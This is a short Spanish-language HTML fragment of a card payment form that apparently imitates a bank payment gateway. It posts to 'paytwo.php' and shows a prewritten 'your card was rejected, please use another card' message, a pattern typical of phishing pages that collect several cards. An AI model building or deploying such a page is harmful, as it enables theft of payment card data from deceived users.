...
<form autocomplete="off" name="formTarjeta" action="paytwo.php" method="post">
<div style="min-height:16px !important; overflow-y: auto;" class="cards-mod-wr">
<div class="tituloPagoTarjeta" style="background-image: url(&quot;/sis/graficos/logotipos/comunes/2100abrirpuntaarriba.png&quot;); margin-bottom: 25px;">
...
<span style="color:red;margin-left: 15px;">Su tarjeta fue rechazada, por favor use otra tarjeta.</span>
<div class="datosTarjeta" style="margin-top: 15px;">
...
<br>
<button lngid="cancelar" onclick="javascript:cancelar();" id="divImgCancelar" class="btn btn-lg btn-cancel" type="button">Cancelar</button><button lngid="aceptar" onclick="javascript:validar();" id="divImgAceptar" class="btn btn-lg btn-accept" type="button">Pagar</button>
</div></div>
</div>
